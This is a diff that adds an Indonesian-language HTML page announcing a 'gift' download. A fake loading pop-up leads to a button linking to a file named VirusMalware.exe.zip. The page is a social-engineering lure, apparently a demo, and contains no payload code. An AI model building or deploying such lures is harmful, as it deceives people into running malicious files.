@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Download</title>
+  <link rel="stylesheet" href="../public/css/index.css" />
+</head>
+
+<body>
+  <div class="container">
+    <div id="judul">
+      <h1 class="text">WELCOME</h1>
+    </div>
+
+    <h2 class="text" style="text-align: center;">DOWNLOAD HADIAH ANDA!</h2>
+    <button id="startBtn" class="button">HADIAH</button>
+  </div>
+
+  <!-- Pop-up Loading -->
+  <div id="pop-up-download">
+    <div class="loading-box">
+      <div id="spinner"></div>
+      <div id="loading">Menyiapkan hadiah... <span id="percent">0%</span></div>
+    </div>
+  </div>
+
+  <!-- Pop-up Download Siap -->
+  <div id="download-ready">
+    <div class="loading-box">
+      <p id="text-siap">🎉 Hadiah siap didownload!</p>
+      <a id="downloadBtn" class="button" href="../resource/VirusMalware.exe.zip" download>Download Sekarang</a>
+    </div>
+  </div>
+
+  <script src="../public/js/index.js"></script>
+</body>
+
+</html>
